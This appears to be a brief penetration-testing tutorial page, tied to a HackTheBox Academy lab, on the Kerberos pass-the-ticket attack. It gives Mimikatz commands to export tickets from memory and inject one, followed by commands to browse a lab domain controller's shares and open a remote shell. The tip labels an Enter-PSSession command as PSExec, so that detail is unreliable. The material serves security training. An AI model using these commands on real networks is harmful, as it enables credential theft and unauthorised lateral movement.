# Pass the Ticket

In this attack, we use a stolen Kerberos ticket to move laterally instead of an NTLM password hash.

## External Resources

- [HackTheBox Academy](https://academy.hackthebox.com/module/147/section/1639)

## Examples

### Inject a Kerberos ticket into the current session

First, we need to harvest the Kerberos ticket. We can use Mimikatz for this:

```batch
mimikatz.exe "privilege::debug" "sekurlsa::tickets /export" "exit"
```

A few `.kirbi` files will be created in the current directory. These are the Kerberos tickets.

We can use `mimikatz.exe` to inject the ticket into our current session:

```batch
mimikatz.exe "kerberos::ptt [0;4e7ef]-2-0-40e10000-julio@krbtgt-INLANEFREIGHT.HTB.kirbi" "exit"
dir \\DC01.inlanefreight.htb\sharename
dir \\DC01.inlanefreight.htb\c$\Users
```

:::tip Get a remote shell

If we have enough privileges, we can try to use PSExec to get a remote shell:

```powershell
Enter-PSSession -ComputerName DC01.inlanefreight.htb
```

:::

